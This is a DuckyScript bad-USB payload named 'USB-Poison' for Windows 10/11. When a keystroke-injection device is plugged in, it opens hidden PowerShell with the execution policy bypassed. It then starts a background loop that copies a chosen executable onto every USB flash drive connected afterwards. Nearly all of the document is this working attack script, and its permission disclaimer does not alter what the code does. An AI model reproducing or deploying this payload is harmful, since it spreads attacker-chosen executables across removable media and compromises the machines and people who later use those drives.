REM Author:      beigeworm 
REM Title:       USB-Poison
REM Target:      Windows 10/11 
REM Description: This script waits for new USB flash storage devices to be connected.
REM Description: When a new device connects, this script will copy a desired file to the root of newly connected drive.

REM **THIS SCRIPT IS INTENDED FOR USE ON SYSTEMS YOU OWN OR HAVE BEEN GIVEN PERMISSION TO USE!**

REM Define the local path to your file to copy.
DEFINE #FILEPATH path/to/your/file.exe

REM Funtion to detect Windows is ready for keystrokes
EXTENSION PASSIVE_WINDOWS_DETECT
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM CONFIGURATION:
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7

    $_OS = #NOT_WINDOWS

    VAR $MAX_TRIES = #MAX_WAIT
    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF

END_EXTENSION
IF $_OS != WINDOWS
    LED_R                                                                                                                                       
    STOP_PAYLOAD 
END_IF

REM Main bad-USB script
LED_G
GUI r
DELAY 500
STRINGLN powershell -Ep Bypass -W H
DELAY 3000
STRINGLN $file="#FILEPATH";while($true){$initialDrives=Get-WMIObject Win32_LogicalDisk | ? {$_.DriveType -eq 2} | select DeviceID;while($true){$currentDrives=Get-WMIObject Win32_LogicalDisk | ? {$_.DriveType -eq 2} | select DeviceID;$newDrive=$currentDrives | Where-Object { $initialDrives.DeviceID -notcontains $_.DeviceID};if($newDrive){$drive=Get-WMIObject Win32_LogicalDisk | ? {$_.DriveType -eq 2} | Where-Object {$initialDrives.DeviceID -notcontains $_.DeviceID};$driveletter=($drive.DeviceID + '/');Copy-Item -Path $file -Destination $driveletter;sleep 1;break}sleep 1}}